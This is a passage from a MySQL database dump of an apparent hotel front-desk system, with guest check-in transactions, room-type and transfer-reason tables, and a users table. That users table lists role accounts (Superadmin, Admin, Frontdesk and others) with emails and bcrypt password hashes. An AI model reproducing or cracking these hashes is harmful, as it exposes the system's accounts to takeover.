21:33:14',NULL,'Guest Checked In at room #55',NULL,0,'2025-11-21 21:33:14','2025-11-21 21:33:14'),(236,1,213,36,3,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,1000,352,200,'2025-11-21 21:33:14',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 21:33:14','2025-11-21 21:33:14'),(237,1,213,36,3,8,'\"[2,\\\"Bhong\\\"]\"','Amenities',100,100,0,0,'2025-11-21 21:33:35',NULL,'Guest Added Amenities: (5) EXTRA BLANKET',NULL,0,'2025-11-21 21:33:32','2025-11-21 21:33:35'),(238,1,214,37,2,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',760,1000,240,0,'2025-11-21 21:36:25',NULL,'Guest Checked In at room #59',NULL,0,'2025-11-21 21:36:25','2025-11-21 21:36:25'),(239,1,214,37,2,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,1000,240,200,'2025-11-21 21:36:25',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 21:36:25','2025-11-21 21:36:25'),(240,1,214,37,2,6,'\"[2,\\\"Bhong\\\"]\"','Extension',760,760,0,0,'2025-11-21 21:37:28',NULL,'Guest Extension : 12 hours',NULL,0,'2025-11-21 21:37:10','2025-11-21 21:37:28'),(241,1,214,37,2,8,'\"[2,\\\"Bhong\\\"]\"','Amenities',100,100,0,0,'2025-11-21 21:37:28',NULL,'Guest Added Amenities: (5) EXTRA TOWEL',NULL,0,'2025-11-21 21:37:25','2025-11-21 21:37:28'),(242,1,45,38,2,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',760,1000,240,0,'2025-11-21 21:40:03',NULL,'Guest Checked In at room #60',NULL,0,'2025-11-21 21:40:03','2025-11-21 21:40:03'),(243,1,45,38,2,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,1000,240,200,'2025-11-21 21:40:03',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 21:40:03','2025-11-21 21:40:03'),(244,1,45,38,2,6,'\"[2,\\\"Bhong\\\"]\"','Extension',760,0,0,0,NULL,NULL,'Guest Extension : 12 hours',NULL,0,'2025-11-21 21:40:25','2025-11-21 21:40:25'),(245,1,45,38,2,8,'\"[2,\\\"Bhong\\\"]\"','Amenities',40,0,0,0,NULL,NULL,'Guest Added Amenities: (2) EXTRA PILLOW',NULL,0,'2025-11-21 21:40:41','2025-11-21 21:40:41'),(246,1,45,38,2,8,'\"[2,\\\"Bhong\\\"]\"','Amenities',80,0,0,0,NULL,NULL,'Guest Added Amenities: (4) EXTRA BLANKET',NULL,0,'2025-11-21 21:40:55','2025-11-21 21:40:55'),(247,1,45,38,2,8,'\"[2,\\\"Bhong\\\"]\"','Amenities',20,0,0,0,NULL,NULL,'Guest Added Amenities: (1) EXTRA FITTED SHEET',NULL,0,'2025-11-21 21:41:08','2025-11-21 21:41:08'),(248,1,45,38,2,9,'\"[2,\\\"Bhong\\\"]\"','Food and Beverages',10,0,0,0,NULL,NULL,'Guest Added Food and Beverages: (Front Desk) (1) Chippy',NULL,0,'2025-11-21 21:41:39','2025-11-21 21:41:39'),(249,1,45,38,2,9,'\"[2,\\\"Bhong\\\"]\"','Food and Beverages',75,0,0,0,NULL,NULL,'Guest Added Food and Beverages: (Front Desk) (5) Nature\'s Spring 10ML',NULL,0,'2025-11-21 21:41:49','2025-11-21 21:41:49');
/*!40000 ALTER TABLE `transactions` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `transfer_reasons`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `transfer_reasons` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `reason` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `transfer_reasons_branch_id_foreign` (`branch_id`),
  CONSTRAINT `transfer_reasons_branch_id_foreign` FOREIGN KEY (`branch_id`) REFERENCES `branches` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `transfer_reasons` WRITE;
/*!40000 ALTER TABLE `transfer_reasons` DISABLE KEYS */;
INSERT INTO `transfer_reasons` VALUES (1,1,'Guba Aircon ','2025-11-18 15:02:44','2025-11-18 15:02:44');
/*!40000 ALTER TABLE `transfer_reasons` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `types`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `types` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `types` WRITE;
/*!40000 ALTER TABLE `types` DISABLE KEYS */;
INSERT INTO `types` VALUES (1,1,'Single size Bed',NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(2,1,' Double size Bed',NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(3,1,'Twin size Bed',NULL,'2025-11-18 14:23:00','2025-11-18 14:23:00');
/*!40000 ALTER TABLE `types` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `unoccupied_room_reports`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `unoccupied_room_reports` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `shift` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `rooms` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `frontdesk_id` int NOT NULL,
  `partner_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `unoccupied_room_reports` WRITE;
/*!40000 ALTER TABLE `unoccupied_room_reports` DISABLE KEYS */;
/*!40000 ALTER TABLE `unoccupied_room_reports` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `two_factor_secret` text COLLATE utf8mb4_unicode_ci,
  `two_factor_recovery_codes` text COLLATE utf8mb4_unicode_ci,
  `two_factor_confirmed_at` timestamp NULL DEFAULT NULL,
  `branch_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `current_team_id` bigint unsigned DEFAULT NULL,
  `roomboy_assigned_floor_id` bigint unsigned DEFAULT NULL,
  `roomboy_cleaning_room_id` bigint unsigned DEFAULT NULL,
  `profile_photo_path` varchar(2048) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `assigned_frontdesks` json DEFAULT NULL,
  `time_in` datetime DEFAULT NULL,
  `is_active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,1,'Superadmin','superadmin@gmail.com',NULL,'$2y$10$AS0BKyvK6miOacAE/0Tcm.HnBugXPEqcZkR4eFUukZMk3VFNdBxOi',NULL,NULL,NULL,'ALMA RESIDENCES GENSAN',NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,'2025-11-18 14:22:59','2025-11-18 14:22:59'),(2,1,'Admin','admin@gmail.com',NULL,'$2y$10$Uxss8a5CGSv6v4bIOTDO0e5yAnTy/fqaFXCPHimaIqOmecw9FeLLu',NULL,NULL,NULL,'ALMA RESIDENCES GENSAN',NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,'2025-11-18 14:22:59','2025-11-18 14:22:59'),(3,1,'Frontdesk','frontdesk@gmail.com',NULL,'$2y$10$Hy8OBxd.w9aVqWnC.CqAiOBeH3.kOvPmp8j2l/oJgeZgIPsEjI5Ku',NULL,NULL,NULL,'ALMA RESIDENCES GENSAN',NULL,NULL,NULL,NULL,NULL,'\"[1,\\\"Tan\\\"]\"','2025-11-18 15:01:56',1,'2025-11-18 14:22:59','2025-11-20 13:22:31'),(4,1,'Kiosk','kiosk@gmail.com',NULL,'$2y$10$SAJEP6QOtOw3v06ahlvrte/BpW0Pk/cvN4lSpOkY1IM1Y3Gyd9Equ',NULL,NULL,NULL,'ALMA RESIDENCES GENSAN',NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,'2025-11-18 14:22:59','2025-11-18 14:22:59'),(5,1,'Kitchen','kitchen@gmail.com',NULL,'$2y$10$DuUvgQc5q6t1KJC5L4wz9.yW8ETnITjT5Gk1ViPFwA/.ZZiYjHr.2',NULL,NULL,NULL,'ALMA RESIDENCES GENSAN',NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,'2025-11-18 14:22:59','2025-11-18 14:22:59'),(6,1,'Back Office','back-office@gmail.com',NULL,'$2y$10$zfA1Ys0.N79/SkOENhxRjeaPb/SQ8IOkXk1.x/jc3VbJnH44rUaC.',NULL,NULL,NULL,'ALMA RESIDENCES GENSAN',NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,'2025-11-18 14:22:59','2025-11-18 14:22:59'),(7,1,'Roomboy','roomboy@gmail.com',NULL,'$2y$10$bl0dotA2IXhnRQrmVITzq.fzsCuVskAYVRlN7ccMO/Ult.RS8PJhG',NULL,NULL,NULL,'ALMA RESIDENCES GENSAN',NULL,NULL,1,7,NULL,NULL,NULL,1,'2025-11-18 14:23:00','2025-11-20 14:22:03'),(8,1,'PUB Kitchen','pub-kitchen@gmail.com',NULL,'$2y$10$hxtTYrumv9KjjPx6zPpc7ez2JCtcltIlSuUtB8NyO8vGZNcnawaFu',NULL,NULL,NULL,'ALMA RESIDENCES GENSAN',NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,'2025-11-18 14:23:01','2025-11-18 14:23:01'),(9,1,'test','test@gmail.com',NULL,'$2y$10$35Q9oYzxIoTwKNkXE2LTmeOXja9BTqo6nuG.UfbPCWjoFVkSjJhlK',NULL,NULL,NULL,'ALMA RESIDENCES GENSAN',NULL,NULL,NULL,NULL,NULL,'\"[2,\\\"sirok\\\"]\"','2025-11-19 15:06:18',1,'2025-11-19 15:05:00','2025-11-19 15:06:18'),(10,1,'Tan','FrontDeskTan@gmail.com',NULL,'$2y$10$5SEhC8GfozHWYLRFBp.k4O2JFUcR67J5xjrj3sF0nHHOplRdm2cbS',NULL,NULL,NULL,'ALMA RESIDENCES GENSAN',NULL,NULL,NULL,NULL,NULL,'\"[2,\\\"Bhong\\\"]\"','2025-11-21 20:22:12',1,'2025-11-21 20:21:40','2025-11-21 20:22:12');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

